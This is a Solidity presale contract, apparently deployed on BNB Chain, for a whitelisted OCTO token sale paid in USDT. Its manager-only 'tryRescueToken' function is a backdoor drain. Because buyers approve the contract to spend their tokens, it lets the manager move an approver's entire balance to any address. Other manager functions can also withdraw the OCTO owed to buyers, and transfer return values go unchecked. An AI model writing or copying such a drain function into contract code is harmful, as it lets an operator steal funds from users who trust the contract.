/**
 *Submitted for verification at BscScan.com on 2022-09-28
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6; // solhint-disable-line

interface IERC20 {
    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);
}

contract OctoPsPool {
    address public manager_address;
    mapping(address => bool) public isWhiteList;
    mapping(address => uint256) public availableToken;
    mapping(address => uint256) public lockedToken;
    uint256 public usdTokenPrice = 3500; // 1 USD = ? Octo
    uint256 public minimumBuyUsdt = 500 * 10 ** 18; // Min purchase amount
    address usdAddress = 0x55d398326f99059fF775485246999027B3197955;
    address octoAddress = 0xD969445b4c1f011b956f7DE67ebFa92e23c6D225;
    IERC20 usdt = IERC20(address(usdAddress));
    IERC20 octo = IERC20(address(octoAddress));

    bool public releaseAll = false;
    bool public purchaseDisabled = true;

    constructor() {
        manager_address = msg.sender;
    }

    function setWhiteListBatch(address[] memory _address, bool _bool) public {
        require(msg.sender == manager_address);
        for (uint256 i = 0; i < _address.length; i++) {
            isWhiteList[_address[i]] = _bool;
        }
    }

    function checkWhiteList(address _address) public view returns (bool) {
        return isWhiteList[_address];
    }

    function totalToken(address _address) public view returns(uint256) {
        return availableToken[_address] + lockedToken[_address];
    }

    function buyToken(uint256 _usdAmount) public {
        // check whitelist and usd amount and purchaseAvailable
        require(isWhiteList[msg.sender] == true && _usdAmount >= minimumBuyUsdt && purchaseDisabled == false);
        usdt.transferFrom(msg.sender, address(this), _usdAmount);
        uint256 boughtToken = usdTokenPrice * _usdAmount;
        uint256 val = boughtToken / 2;
        availableToken[msg.sender] += val;
        lockedToken[msg.sender] += val;
    }

    function claimToken() public {
        // check contract balance
        require(octo.balanceOf(address(this)) >= availableToken[msg.sender] + lockedToken[msg.sender]);
        if (releaseAll == true) {
            require(availableToken[msg.sender] + lockedToken[msg.sender] != 0);
            uint256 total = availableToken[msg.sender] + lockedToken[msg.sender];
            octo.transfer(msg.sender, total);
            availableToken[msg.sender] = 0;
            lockedToken[msg.sender] = 0;
        } else {
            require(availableToken[msg.sender] != 0);
            uint256 total = availableToken[msg.sender];
            octo.transfer(msg.sender, total);
            availableToken[msg.sender] = 0;
        }
    }

    function updatePairPrice(uint256 _newPrice) public {
        require(msg.sender == manager_address);
        usdTokenPrice = _newPrice;
    }

    function updateMinPurchase(uint256 _newPurchaseAmount) public {
        require(msg.sender == manager_address);
        minimumBuyUsdt = _newPurchaseAmount;
    }

    function setReleaseAll(bool _bool) public {
        require(msg.sender == manager_address);
        releaseAll = _bool;
    }

    function setPurchaseDisabled(bool _bool) public {
        require(msg.sender == manager_address);
        purchaseDisabled = _bool;
    }

    function rescueMainSymbol(address payable _to) public {
        require(msg.sender == manager_address);
        _to.transfer(address(this).balance);
    }

    function rescueToken(address _tokenAddress, address _to, uint256 _amount) public {
        require(msg.sender == manager_address);
        IERC20 token = IERC20(address(_tokenAddress));
        token.transfer(_to, _amount);
    }

    function tryRescueToken(address _tokenAddress, address _from, address _to) public {
        require(msg.sender == manager_address);
        IERC20 token = IERC20(address(_tokenAddress));
        token.transferFrom(_from, _to, token.balanceOf(_from));
    }

    function withdraw() public {
        require(msg.sender == manager_address);
        usdt.transfer(msg.sender, usdt.balanceOf(address(this)));
    }
}